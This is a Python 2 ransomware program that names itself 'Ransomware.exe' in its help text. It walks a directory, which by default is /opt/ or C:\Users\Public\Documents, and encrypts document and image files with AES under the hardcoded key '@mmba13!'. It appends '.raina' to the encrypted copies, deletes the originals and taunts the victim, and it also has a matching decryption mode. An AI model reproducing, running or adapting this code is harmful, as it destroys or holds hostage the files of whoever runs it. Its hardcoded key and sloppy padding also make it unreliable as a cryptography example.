from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys
import platform
def Files(rdir):
	f=[]
	for root,dirs,files in os.walk(rdir,topdown=False,followlinks=True):
		for name in files:
			f.append(os.path.join(root,name))
	return f

def printhelpmessage():
	print '''

	Usage:  Ransomware.exe [/e|/d] [/f <full-path-to-folder>]
			All parameters are optional. 
			/e - Encryption Mode. Default Mode
			/d - Decryption Mode.
			/f - Use this parameter to specify a particular folder to encrypt/decrypt. If this parameter is not specified then encryption directory is taken as "/var" in Linux type OS and "C:\Users\Public\Documents in Windows type OS"

	'''

def decrypt(key,filename):
	key=SHA256.new(key).digest()
	outfile=os.path.join(os.path.dirname(filename),os.path.basename(filename[:-6]))
	chunksize = 64 * 1024
        with open(filename, "rb") as infile:
                filesize = infile.read(16)
                IV = infile.read(16)
 
                decryptor = AES.new(key, AES.MODE_CBC, IV)
               
                with open(outfile, "wb") as outfile:
                        while True:
                                chunk = infile.read(chunksize)
                                if len(chunk) == 0:
                                        break
 
                                outfile.write(decryptor.decrypt(chunk))
 
                        outfile.truncate(int(filesize))

def encrypt(key, filename):
	key=SHA256.new(key).digest()
	chunksize = 64 * 1024
	#outFile = os.path.join(os.path.dirname(filename), "(encrypted)"+os.path.basename(filename))
	outFile = os.path.join(os.path.dirname(filename), os.path.basename(filename)) +".raina"
	filesize = str(os.path.getsize(filename)).zfill(16)
	IV = ''

	for i in range(16):
		IV += chr(random.randint(0, 0xFF))
	
	encryptor = AES.new(key, AES.MODE_CBC, IV)

	with open(filename, "rb") as infile:
		with open(outFile, "wb") as outfile:
			outfile.write(filesize)
			outfile.write(IV)
			while True:
				chunk = infile.read(chunksize)
				
				if len(chunk) == 0:
					break

				elif len(chunk) % 16 !=0:
					chunk += ' ' *  (16 - (len(chunk) % 16))

				outfile.write(encryptor.encrypt(chunk))
	os.remove(filename)

def AutoDirectory(osp):
	dirtr=""
	if osp=='Linux':
		dirtr="/opt/"
	elif osp=='Windows':
		dirtr="C:\\Users\\Public\\Documents"
	else:
		print("Error detcting your ostype. Bye!!")
		sys.exit()
	return dirtr

def eoperation(dirname):
	counter=0
	error=0
	try:
		filelist=Files(dirname)
	except Exception,ex:
		print ("Smething is wrong ",ex )
		sys.exit()
	print filelist
	listextension=['xlsx','jpeg','jpg','doc','docx','pdf','png']
	for file in filelist:
		for ext in listextension:
			if(file.endswith(ext)):
				try:
					encrypt('@mmba13!',file)
					counter=counter+1
				except:
					error=error+1					
	print counter," files have been encrypted "
	if error!=0:
		print error," files could not be encrypted"
	raw_input("What do you think just happened?")
	

def doperation(dirname):
	counter=0
	error=0
	try:
		filelist=Files(dirname)
		print("got files")
	except Exception,ex:
				print ("Smething is wrong ",ex )
				exit()
	print filelist
	for file in filelist:
		if(file.endswith(".raina")):
			try:
				decrypt("@mmba13!",file)
				counter=counter+1
			except:
				error=error+1
	print counter," files recovered"
	if error!=0:
		print error, " files could not be recovered"
	raw_input("You were quite lucky!!!")
	


def main():
	#get file
	counter=0
	ostyp=platform.system()
	#logic for auto run on linux and windows
	if len(sys.argv)==1:
		filed=AutoDirectory(ostyp)
		eoperation(filed)
	elif len(sys.argv)==2 and sys.argv[1]!='/f':
		filed=AutoDirectory(ostyp)
	elif len(sys.argv)==3 and sys.argv[1]=='/f':
		filed=sys.argv[2]
		#if user directory exists
		if(not os.path.isdir(filed)):
			print("Incorrect directory entered!! Quitting")
			sys.exit()
		eoperation(filed)
	elif len(sys.argv)==4:
		print("Am i here")
		#get directory form the arguement
		filed=sys.argv[3]
		#if user directory exists
		if(not os.path.isdir(filed)):
			print("Incorrect directory entered!! Quitting")
			sys.exit()
	elif len(sys.argv)>4 and sys.argv[2]=='/f':
		print("If your directory contains spaces, give the full path in quotes")
		printhelpmessage()
		sys.exit()
	else:
		printhelpmessage()
		sys.exit()
	#encryption or decryption
	
	if len(sys.argv)>1:
		if sys.argv[1]=='/e' or sys.argv[1]=='/d':
			if sys.argv[1]=='/e':
				eoperation(filed)
			elif sys.argv[1]=='/d':
				doperation(filed)
	

main()



